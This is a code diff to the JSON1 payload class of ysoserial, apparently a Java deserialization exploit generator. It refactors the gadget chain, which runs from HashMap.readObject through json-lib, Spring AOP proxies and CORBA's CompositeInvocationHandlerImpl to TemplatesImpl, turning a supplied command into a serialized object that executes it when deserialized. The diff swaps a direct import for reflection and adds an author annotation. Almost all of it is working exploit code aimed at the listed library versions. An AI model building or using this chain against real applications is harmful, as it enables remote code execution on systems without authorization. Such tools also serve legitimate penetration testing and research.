@@ -1,6 +1,7 @@
 package ysoserial.payloads;
 
 
+import ysoserial.payloads.annotation.Authors;
 import ysoserial.payloads.annotation.Dependencies;
 import ysoserial.payloads.util.Gadgets;
 import ysoserial.payloads.util.PayloadRunner;
@@ -21,14 +22,13 @@ import javax.management.openmbean.TabularType;
 import javax.xml.transform.Templates;
 
 import org.springframework.aop.framework.AdvisedSupport;
-import com.sun.corba.se.spi.orbutil.proxy.CompositeInvocationHandlerImpl;
 import net.sf.json.JSONObject;
 
 
 /**
- * 
+ *
  * A bit more convoluted example
- * 
+ *
  * com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties()
  * java.lang.reflect.Method.invoke(Object, Object...)
  * org.springframework.aop.support.AopUtils.invokeJoinpointUsingReflection(Object, Method, Object[])
@@ -52,19 +52,19 @@ import net.sf.json.JSONObject;
  * javax.management.openmbean.TabularDataSupport.equals(Object)
  * java.util.HashMap<K,V>.putVal(int, K, V, boolean, boolean)
  * java.util.HashMap<K,V>.readObject(ObjectInputStream)
- * 
+ *
  * @author mbechler
  *
  */
 @SuppressWarnings ( {
     "rawtypes", "unchecked", "restriction"
 } )
-@Dependencies ( {
-    "net.sf.json-lib:json-lib:jar:jdk15:2.4", "org.springframework:spring-aop:4.1.4.RELEASE",
+@Dependencies({ "net.sf.json-lib:json-lib:jar:jdk15:2.4", "org.springframework:spring-aop:4.1.4.RELEASE",
     // deep deps
-    "aopalliance:aopalliance:1.0", "commons-logging:commons-logging:1.2", "commons-lang:commons-lang:2.6", "net.sf.ezmorph:ezmorph:1.0.6",
-    "commons-beanutils:commons-beanutils:1.9.2", "org.springframework:spring-core:4.1.4.RELEASE", "commons-collections:commons-collections:3.1"
-} )
+    "aopalliance:aopalliance:1.0", "commons-logging:commons-logging:1.2", "commons-lang:commons-lang:2.6",
+    "net.sf.ezmorph:ezmorph:1.0.6", "commons-beanutils:commons-beanutils:1.9.2",
+    "org.springframework:spring-core:4.1.4.RELEASE", "commons-collections:commons-collections:3.1" })
+@Authors({ Authors.MBECHLER })
 public class JSON1 implements ObjectPayload<Object> {
 
     public Map getObject ( String command ) throws Exception {
@@ -94,12 +94,11 @@ public class JSON1 implements ObjectPayload<Object> {
         // it's very likely that there are other proxy impls that could be used
         AdvisedSupport as = new AdvisedSupport();
         as.setTarget(payload);
-        InvocationHandler delegateInvocationHandler = (InvocationHandler) Reflections
-                .getFirstCtor("org.springframework.aop.framework.JdkDynamicAopProxy").newInstance(as);
+        InvocationHandler delegateInvocationHandler = (InvocationHandler) Reflections.newInstance("org.springframework.aop.framework.JdkDynamicAopProxy", as);
         InvocationHandler cdsInvocationHandler = Gadgets.createMemoizedInvocationHandler(Gadgets.createMap("getCompositeType", rt));
-        CompositeInvocationHandlerImpl invocationHandler = new CompositeInvocationHandlerImpl();
-        invocationHandler.addInvocationHandler(CompositeData.class, cdsInvocationHandler);
-        invocationHandler.setDefaultHandler(delegateInvocationHandler);
+        InvocationHandler invocationHandler = (InvocationHandler) Reflections.newInstance("com.sun.corba.se.spi.orbutil.proxy.CompositeInvocationHandlerImpl");
+        ((Map) Reflections.getFieldValue(invocationHandler, "classToInvocationHandler")).put(CompositeData.class, cdsInvocationHandler);
+        Reflections.setFieldValue(invocationHandler, "defaultHandler", delegateInvocationHandler);
         final CompositeData cdsProxy = Gadgets.createProxy(invocationHandler, CompositeData.class, ifaces);
 
         JSONObject jo = new JSONObject();
